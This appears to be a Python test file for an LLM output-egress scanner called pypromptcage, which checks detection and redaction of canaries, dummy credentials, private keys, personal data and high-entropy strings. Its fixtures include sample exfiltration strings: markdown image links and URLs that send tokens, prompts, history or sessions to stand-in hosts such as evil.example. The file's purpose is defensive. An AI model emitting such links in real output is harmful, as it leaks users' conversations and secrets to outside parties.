import unittest

from pypromptcage import inspect_output, sanitize_output, scan_egress
from helpers import add_cases, has_finding


def make_token(seed, length):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(alphabet[(seed + index * 17) % len(alphabet)] for index in range(length))


def luhn_complete(prefix):
    for digit in range(10):
        candidate = prefix + str(digit)
        total = 0
        double_digit = False
        for ch in reversed(candidate):
            value = ord(ch) - 48
            if double_digit:
                value *= 2
                if value > 9:
                    value -= 9
            total += value
            double_digit = not double_digit
        if total % 10 == 0:
            return candidate
    raise ValueError("no luhn digit")


class EgressCaseTests(unittest.TestCase):
    pass


canaries = [
    "cage-canary-alpha-001",
    "do-not-repeat-7f3a91",
    "prompt-canary-zulu",
    "private-canary-value",
    "egress sentinel text",
    "test canary omega",
    "synthetic-marker-12345",
    "model-output-canary",
    "hidden benchmark phrase",
    "integrity-check-string",
]


def canary_case(self, canary):
    report = inspect_output("safe prefix " + canary + " safe suffix", {"canary_tokens": [canary]})
    self.assertTrue(has_finding(report, "GP-EGR-CANARY-001"))
    self.assertEqual(report.action, "block")
    self.assertNotIn(canary, report.redacted)


add_cases(EgressCaseTests, "canary", canaries, canary_case)


markdown_images = [
    "![x](https://evil.example/img?data=abcdefghijklmnopqrstuvwx)",
    "![alt](https://attacker.example/pixel?token=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![](https://collect.example/a.png?secret=123456789012345678901234)",
    "![diagram](http://example.net/i?prompt=abcdefghijklmnopqrstuvwx)",
    "![x](https://example.com/a?key=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![x](https://example.com/a?password=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![x](https://example.com/a?history=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![x](https://example.com/a?messages=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![x](https://example.com/a?context=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![x](https://example.com/a?session=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![x](https://example.com/a?payload=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![x](https://example.com/a.png?data=ABCDEFGHIJKLMNOPQRSTUVWX)",
    "![wide alt text](https://example.org/x?data=abcdefghijklmnopqrstuvwx)",
    "![x](https://sub.example.co.uk/img?data=abcdefghijklmnopqrstuvwx)",
    "![x](http://insecure.example/img?data=abcdefghijklmnopqrstuvwx)",
]


def markdown_case(self, value):
    self.assertTrue(has_finding(scan_egress(value), "GP-EGR-MARKDOWN-IMG-001"))


add_cases(EgressCaseTests, "markdown_image", markdown_images, markdown_case)


data_urls = [
    "data:text/html;base64,QUJDREVGR0hJSktMTU5P",
    "data:image/svg+xml;base64,QUJDREVGR0hJSktMTU5P",
    "data:image/png;base64,QUJDREVGR0hJSktMTU5P",
    "data:text/plain,abcdefgh",
    "data:application/octet-stream;base64,QUJDREVGR0hJSktMTU5P",
    "data:text/html,abcdefgh",
    "data:image/gif;base64,QUJDREVGR0hJSktMTU5P",
    "data:image/jpeg;base64,QUJDREVGR0hJSktMTU5P",
    "data:application/pdf;base64,QUJDREVGR0hJSktMTU5P",
    "data:text/plain;base64,QUJDREVGR0hJSktMTU5P",
]


def data_url_case(self, value):
    self.assertTrue(has_finding(scan_egress("x " + value + " y"), "GP-EGR-DATAURL-001"))


add_cases(EgressCaseTests, "data_url", data_urls, data_url_case)


credential_assignments = [
    "api_key = cage-test-token-abcdef123456",
    "apikey: cage-test-token-abcdef123456",
    'api-key = "cage-test-token-abcdef123456"',
    "token = cage-test-token-abcdef123456",
    "access_token = cage-test-token-abcdef123456",
    "access-token: cage-test-token-abcdef123456",
    "auth_token = cage-test-token-abcdef123456",
    "secret = cage-test-token-abcdef123456",
    "password = correct-horse-test-value",
    "client_secret = cage-test-token-abcdef123456",
    "private_token = cage-test-token-abcdef123456",
    "Authorization: Bearer abcdef1234567890",
    "authorization: bearer abcdef1234567890abcdef",
    "API_KEY=cage-test-token-abcdef123456",
    "TOKEN: cage-test-token-abcdef123456",
    'secret: "cage-test-token-abcdef123456"',
    "password = pass-word-test-123456",
    "client-secret = cage-test-token-abcdef123456",
    "private-token = cage-test-token-abcdef123456",
    "auth-token = cage-test-token-abcdef123456",
]


def credential_case(self, value):
    report = inspect_output("prefix " + value + " suffix")
    self.assertTrue(has_finding(report, "GP-EGR-CREDENTIAL-001"))
    self.assertEqual(report.action, "block")
    self.assertNotIn("cage-test-token-abcdef123456", report.redacted)


add_cases(EgressCaseTests, "credential", credential_assignments, credential_case)


private_keys = [
    "-----BEGIN PRIVATE KEY-----\nMIIBtest\n-----END PRIVATE KEY-----",
    "-----BEGIN RSA PRIVATE KEY-----\nMIIBtest\n-----END RSA PRIVATE KEY-----",
    "-----BEGIN EC PRIVATE KEY-----\nMIIBtest\n-----END EC PRIVATE KEY-----",
    "-----BEGIN OPENSSH PRIVATE KEY-----\nMIIBtest\n-----END OPENSSH PRIVATE KEY-----",
]


def private_key_case(self, value):
    report = inspect_output(value)
    self.assertTrue(has_finding(report, "GP-EGR-PRIVATEKEY-001"))
    self.assertEqual(report.action, "block")


add_cases(EgressCaseTests, "private_key", private_keys, private_key_case)


def jwt_case(self, seed):
    token = (
        "eyJ" + make_token(seed, 24).replace("+", "A").replace("/", "B") + "."
        + make_token(seed + 1, 24).replace("+", "B").replace("/", "C") + "."
        + make_token(seed + 2, 20).replace("+", "C").replace("/", "D")
    )
    report = inspect_output("token value " + token)
    self.assertTrue(has_finding(report, "GP-EGR-CREDENTIAL-001"))


add_cases(EgressCaseTests, "three_part_token", [11, 12, 13], jwt_case)


emails = [
    "person@example.com",
    "first.last@example.org",
    "team+test@example.net",
    "a@example.co",
    "long.name.with.parts@sub.example.com",
    "dash-name@example-domain.com",
    "under_score@example.io",
    "percent%name@example.dev",
    "user123@example.ai",
    "contact@example.security",
]


def email_case(self, email):
    self.assertTrue(has_finding(scan_egress("contact " + email), "GP-EGR-PII-001"))


add_cases(EgressCaseTests, "email", emails, email_case)


def identifier_case(self, value):
    self.assertTrue(has_finding(scan_egress("id " + value), "GP-EGR-PII-001"))


add_cases(EgressCaseTests, "identifier", ["000-00-0000", "123-45-6789", "999-99-9999"], identifier_case)


def card_case(self, prefix):
    card = luhn_complete(prefix)
    self.assertTrue(has_finding(scan_egress("card " + card), "GP-EGR-PII-001"))


add_cases(EgressCaseTests, "payment_card", ["00000000000000", "0000000000000", "1234500000000", "9999900000000", "5555500000000"], card_case)


exfil_urls = [
    "https://evil.example/collect?data=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?token=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?secret=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?key=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?password=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?prompt=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?system=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?history=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?messages=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?context=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?session=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?payload=abcdefghijklmnopqrstuvwx",
    "https://evil.example/collect?data=QUJDREVGR0hJSktMTU5P",
    "https://evil.example/collect?token=0123456789abcdef0123456789abcdef",
    "https://evil.example/collect?secret=" + "x" * 80,
]


def exfil_url_case(self, url):
    self.assertTrue(has_finding(scan_egress("open " + url), "GP-EGR-URL-EXFIL-001"))


add_cases(EgressCaseTests, "url_exfiltration", exfil_urls, exfil_url_case)


benign_urls = [
    "https://example.com/docs",
    "https://example.com/search?q=security",
    "https://example.com/item?id=123",
    "https://example.com/docs?section=llm",
    "https://example.com/page?data=short",
    "https://example.com/page?token=short",
    "https://example.com/path/to/page",
    "http://example.net/reference",
]


def benign_url_case(self, url):
    self.assertFalse(has_finding(scan_egress("see " + url), "GP-EGR-URL-EXFIL-001"))


add_cases(EgressCaseTests, "benign_url", benign_urls, benign_url_case)


def high_entropy_case(self, seed):
    token = make_token(seed, 48)
    self.assertTrue(has_finding(scan_egress("value " + token + " end"), "GP-EGR-HIGHENTROPY-001"))


add_cases(EgressCaseTests, "high_entropy", list(range(101, 111)), high_entropy_case)


def hex_entropy_case(self, seed):
    state = seed
    token = ""
    while len(token) < 48:
        state = (state * 1664525 + 1013904223) & 0xFFFFFFFF
        token += format(state % 16, "x")
    self.assertTrue(has_finding(scan_egress("hex " + token), "GP-EGR-HIGHENTROPY-001"))


add_cases(EgressCaseTests, "hex_entropy", list(range(201, 206)), hex_entropy_case)


benign_outputs = [
    "Here is a concise summary of the document.",
    "The release includes bug fixes and documentation improvements.",
    "Visit https://example.com/docs for public documentation.",
    "Use a password manager to generate unique passwords.",
    "The word token appears in this explanatory sentence.",
    "A private key should never be exposed.",
    "Contact support through the public form.",
    "The image syntax is explained without rendering an image.",
    "Base64 is an encoding, not encryption.",
    "No sensitive data is present here.",
    "Security reviews should be deterministic.",
    "The quick brown fox jumps over the lazy dog.",
    "One two three four five six seven eight nine ten.",
    "ordinarylonglowercasewordwithmeaninglesscontent",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
]


def benign_output_case(self, output):
    report = inspect_output(output)
    self.assertEqual(report.action, "allow")
    self.assertEqual(report.risk_score, 0)


add_cases(EgressCaseTests, "benign_output", benign_outputs, benign_output_case)


class EgressScalarTests(unittest.TestCase):

    def test_serialized_json_credential_fixture_is_detected(self):
        findings = scan_egress('{"api_key":"cage-test-token-abcdef123456"}')
        self.assertTrue(has_finding(findings, "GP-EGR-CREDENTIAL-001"))

    def test_trusted_markdown_image_host_is_allowed(self):
        findings = scan_egress("![x](https://images.example.com/a.png)", {"trusted_image_hosts": ["example.com"]})
        self.assertFalse(has_finding(findings, "GP-EGR-MARKDOWN-IMG-001"))

    def test_trusted_host_matching_includes_subdomains_not_lookalikes(self):
        good = scan_egress("![x](https://cdn.example.com/a.png)", {"trusted_image_hosts": ["example.com"]})
        bad = scan_egress("![x](https://badexample.com/a.png)", {"trusted_image_hosts": ["example.com"]})
        self.assertFalse(has_finding(good, "GP-EGR-MARKDOWN-IMG-001"))
        self.assertTrue(has_finding(bad, "GP-EGR-MARKDOWN-IMG-001"))

    def test_checksum_invalid_payment_card_is_not_flagged(self):
        findings = scan_egress("card 0000000000000001")
        self.assertFalse(any(f.id == "GP-EGR-PII-001" and "payment-card" in f.description for f in findings))

    def test_sanitize_output_returns_redacted_string(self):
        output = sanitize_output("api_key = cage-test-token-abcdef123456")
        self.assertIsInstance(output, str)
        self.assertNotIn("cage-test-token-abcdef123456", output)
        self.assertIn("[redacted]", output)

    def test_output_redaction_preserves_safe_prefix_and_suffix(self):
        report = inspect_output("safe prefix api_key = cage-test-token-abcdef123456 safe suffix")
        self.assertIn("safe prefix", report.redacted)
        self.assertIn("safe suffix", report.redacted)

    def test_credential_evidence_does_not_include_secret_value(self):
        report = inspect_output("api_key = cage-test-token-abcdef123456")
        finding = next(item for item in report.findings if item.id == "GP-EGR-CREDENTIAL-001")
        self.assertNotIn("cage-test-token-abcdef123456", finding.evidence)

    def test_url_exfiltration_evidence_omits_query_values(self):
        secret = "abcdefghijklmnopqrstuvwx"
        report = inspect_output("https://evil.example/collect?data=" + secret)
        finding = next(item for item in report.findings if item.id == "GP-EGR-URL-EXFIL-001")
        self.assertNotIn(secret, finding.evidence)

    def test_same_output_scan_is_deterministic(self):
        value = "api_key = cage-test-token-abcdef123456 person@example.com"
        first = inspect_output(value)
        second = inspect_output(value)
        self.assertEqual(second.findings, first.findings)
        self.assertEqual(second.redacted, first.redacted)

    def test_oversized_output_is_rejected(self):
        with self.assertRaisesRegex(Exception, "exceeds max_input_length"):
            inspect_output("x" * 200, {"max_input_length": 128})

    def test_canary_tokens_validate_entries(self):
        with self.assertRaisesRegex(Exception, "length 1"):
            scan_egress("hello", {"canary_tokens": [""]})

    def test_trusted_image_hosts_validate_entries(self):
        with self.assertRaisesRegex(Exception, "length 1"):
            scan_egress("hello", {"trusted_image_hosts": [""]})

    def test_all_egress_findings_use_cwe_200_and_owasp_llm02(self):
        findings = scan_egress("api_key = cage-test-token-abcdef123456 person@example.com")
        self.assertGreater(len(findings), 0)
        for finding in findings:
            self.assertEqual(finding.cwe, "CWE-200")
            self.assertEqual(finding.owasp, "LLM02:2025")


if __name__ == "__main__":
    unittest.main()
